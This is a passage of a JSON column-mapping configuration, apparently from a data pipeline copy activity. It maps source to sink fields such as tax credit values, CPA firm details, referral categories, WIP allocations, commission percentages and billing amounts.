                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""FinalCredit"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ValueAssessment"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""ValueAssessment"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""BDID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""BDID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""BD"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""BD"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""RDID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""RDID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""RD"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""RD"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""BD2ID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""BD2ID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""BD2"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""BD2"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""RD2ID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""RD2ID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""RD2"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""RD2"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""BDisRD"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""BDisRD"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MatterDisplayName"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""MatterDisplayName"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ProjectName"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""ProjectName"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MinTaxYear"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""MinTaxYear"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MaxTaxYear"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""MaxTaxYear"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Industry"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""Industry"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SubIndustry"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""SubIndustry"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""NAICSCode"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""NAICSCode"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ParentCPA"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""ParentCPA"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ParentCPAFirmID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""ParentCPAFirmID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ParentCPAFirmAlliance"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""ParentCPAFirmAlliance"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ParentCPAFirmBillingCity"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""ParentCPAFirmBillingCity"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ParentCPAFirmBillingState"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""ParentCPAFirmBillingState"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ChildCPA"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""ChildCPA"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""CPAFirmID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""CPAFirmID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""CPAAlliance"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""CPAAlliance"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""FeeCapPercentageType"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""FeeCapPercentageType"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""FeeType"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""FeeType"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""FeeCapPercent"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""FeeCapPercent"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""OpportunityID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""OpportunityID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""NewExistingClient"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""NewExistingClient"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""NewExistingCPAFlag"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""NewExistingCPAFlag"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""NewExistingCPAParentFlag"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""NewExistingCPAParentFlag"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""NumberofEmployees"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""NumberofEmployees"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Year"",
                                    ""type"": ""Int16"",
                                    ""physicalType"": ""smallint""
                                },
                                ""sink"": {
                                    ""name"": ""Year"",
                                    ""type"": ""Int16"",
                                    ""physicalType"": ""smallint""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""QuarterID"",
                                    ""type"": ""Int16"",
                                    ""physicalType"": ""smallint""
                                },
                                ""sink"": {
                                    ""name"": ""QuarterID"",
                                    ""type"": ""Int16"",
                                    ""physicalType"": ""smallint""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MonthID"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""MonthID"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Month"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""Month"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""WeekID"",
                                    ""type"": ""Int16"",
                                    ""physicalType"": ""smallint""
                                },
                                ""sink"": {
                                    ""name"": ""WeekID"",
                                    ""type"": ""Int16"",
                                    ""physicalType"": ""smallint""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ClientAccountID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""ClientAccountID"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Evergreen"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""Evergreen"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""AutoRenewal"",
                                    ""type"": ""Boolean"",
                                    ""physicalType"": ""bit""
                                },
                                ""sink"": {
                                    ""name"": ""AutoRenewal"",
                                    ""type"": ""Boolean"",
                                    ""physicalType"": ""bit""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""OneTimeAdjusted"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""OneTimeAdjusted"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PBDAllocationPercent"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 8,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""PBDAllocationPercent"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 8,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SBDAllocationPercent"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 8,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""SBDAllocationPercent"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 8,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PRDAllocationPercent"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 8,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""PRDAllocationPercent"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 8,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SRDAllocationPercent"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 8,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""SRDAllocationPercent"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 8,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PBDAllocatedWIP"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""PBDAllocatedWIP"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SBDAllocatedWIP"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""SBDAllocatedWIP"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PRDAllocatedWIP"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""PRDAllocatedWIP"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SRDAllocatedWIP"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""SRDAllocatedWIP"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PBDAllocatedOriginalWip"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""PBDAllocatedOriginalWip"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SBDAllocatedOriginalWip"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""SBDAllocatedOriginalWip"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PRDAllocatedOriginalWip"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""PRDAllocatedOriginalWip"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SRDAllocatedOriginalWip"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""SRDAllocatedOriginalWip"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 6,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PBDCommissionPercent"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""PBDCommissionPercent"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SBDCommissionPercent"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""SBDCommissionPercent"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PRDCommissionPercent"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""PRDCommissionPercent"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SRDCommissionPercent"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""SRDCommissionPercent"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PM"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""PM"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""TD"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""TD"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Billed"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""Billed"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Collected"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""Collected"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""RemainingWIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""RemainingWIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""BilledAmtFlag"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""BilledAmtFlag"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ReferralCategory"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""ReferralCategory"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ReferralSubCategory"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""ReferralSubCategory"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""DerivedCategory"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""DerivedCategory"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""IsDirect"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""IsDirect"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""IsEandA"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""IsEandA"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""IsCPA"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""IsCPA"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""IsClientEmployee"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""IsClientEmployee"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""IsIPandA"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""IsIPandA"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""IndustryPatnership"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""IndustryPatnership"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""IPAAccount"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""IPAAccount"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ReferringAccount"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""ReferringAccount"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MainTermReason"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""MainTermReason"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SubTermReason"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""SubTermReason"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""TaskDue"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""date""
                                },
                                ""sink"": {
                                    ""name"": ""TaskDue"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""date""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""TaskCompleted"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""date""
                                },
                                ""sink"": {
                                    ""name"": ""TaskCompleted"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""date""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MatterStatus"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""MatterStatus"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Matterstatuscode"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""Matterstatuscode"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MatterStatusDate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                },
                                ""sink"": {
                                    ""name"": ""MatterStatusDate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""NumberSubmission"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""date""
                                },
                                ""sink"": {
                                    ""name"": ""NumberSubmission"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""date""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""BillingGroupName"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""BillingGroupName"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""BillingGroupDescription"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""BillingGroupDescription"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""StageName"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""StageName"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""DataLoadedOn"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                },
                                ""sink"": {
                                    ""name"": ""DataLoadedOn"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""WipVariance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""WipVariance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PC_VADate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                },
                                ""sink"": {
                                    ""name"": ""PC_VADate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PC_Status"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""PC_Status"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""FinancePriorWeekWIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""FinancePriorWeekWIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PC_TriggerType"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""PC_TriggerType"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ConferenceName"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""ConferenceName"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MS_OpIndustryDesc"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""MS_OpIndustryDesc"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Workyear"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""Workyear"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PH_EffStart"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""PH_EffStart"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""CPAFirmBillingState"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""CPAFirmBillingState"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""CPAFirmBillingCity"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""CPAFirmBillingCity"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PBDPRD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""PBDPRD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PBDSRD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""PBDSRD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SBDPRD_WIP_Variance"",
                                    ""type"": ""Double"",
